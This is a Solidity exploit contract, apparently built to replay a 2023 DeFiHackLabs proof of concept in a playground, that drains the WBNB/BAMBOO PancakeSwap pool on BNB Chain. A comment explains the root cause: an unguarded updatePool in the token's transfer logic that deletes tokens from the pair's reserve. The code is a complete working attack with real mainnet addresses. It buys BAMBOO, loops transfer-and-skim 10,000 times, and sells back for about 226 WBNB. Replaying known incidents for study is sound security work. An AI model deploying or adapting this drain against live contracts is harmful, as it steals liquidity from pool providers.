// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Bamboo).
// The DeFiHackLabs PoC (test/Bamboo_exp.sol) runs the whole attack INLINE in the
// Foundry test contract `BambooTest` (attacker = address(this); the test's own
// comment calls the initial `deal()` a mocked flash loan — there is no real
// flash-loan callback and no standalone exploit contract). This contract is a
// faithful, self-contained copy of that inline attack (testExploit's body moved
// into `run()`) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/Bamboo_exp.sol.
//
// Root cause (BambooAI / BAMBOO token, verified on BscScan): BambooAI._transfer
// calls a private helper `updatePool(amount)` on every non-pair-sender transfer
// once trading has started. updatePool reaches into the WBNB/BAMBOO pair's own
// BAMBOO balance, deletes amount/100 of it, credits a hidden hard-coded `Factory`
// sink address, and calls pair.sync() -- with NO access control and NO WBNB ever
// moving. The attacker buys BAMBOO up front, then repeats a fixed-size
// self -> pair transfer 10,000 times: each call's updatePool() siphons a fixed
// ~13.44M BAMBOO out of the pair's reserve (amount/100, constant since `amount`
// is constant) and the accompanying pair.skim(self) merely reclaims the BAMBOO
// dust the transfer itself just moved into the pair (skim never returns WBNB,
// since the pair's WBNB balance always equals its WBNB reserve -- untouched by
// updatePool). After ~10,000 iterations the pool's BAMBOO reserve has collapsed
// ~99% while its WBNB reserve is unchanged, so the BAMBOO the attacker bought
// up-front is now worth far more WBNB than it cost; selling it back nets ~226
// WBNB of the pool's honest liquidity.
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function skim(address to) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
}

contract BambooDrain {
    IERC20 constant wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant bamboo = IERC20(0xED56784bC8F2C036f6b0D8E04Cb83C253e4a6A94);

    IPancakePair constant wbnbBambooPair = IPancakePair(0x0557713d02A15a69Dea5DD4116047e50F521C1b1);
    IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    uint256 constant SIPHON_TRANSFER_AMOUNT = 1_343_870_967_101_818_317;
    uint256 constant LOOP_ITERATIONS = 10_000;

    // testExploit(), verbatim: the 4,000 WBNB "mocked flash loan" is seeded by the
    // playground's `setup.dealToken` (not replicated here) before run() executes.
    function run() external {
        uint256 bambooBalance = bamboo.balanceOf(address(wbnbBambooPair));

        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bamboo);
        uint256[] memory amounts = router.getAmountsIn((bambooBalance * 9) / 10, path);

        wbnb.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(amounts[1], 0, path, address(this), block.timestamp);

        for (uint256 i; i < LOOP_ITERATIONS; ++i) {
            bamboo.transfer(address(wbnbBambooPair), SIPHON_TRANSFER_AMOUNT);
            wbnbBambooPair.skim(address(this));
        }

        path[0] = address(bamboo);
        path[1] = address(wbnb);
        bamboo.approve(address(router), type(uint256).max);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bamboo.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
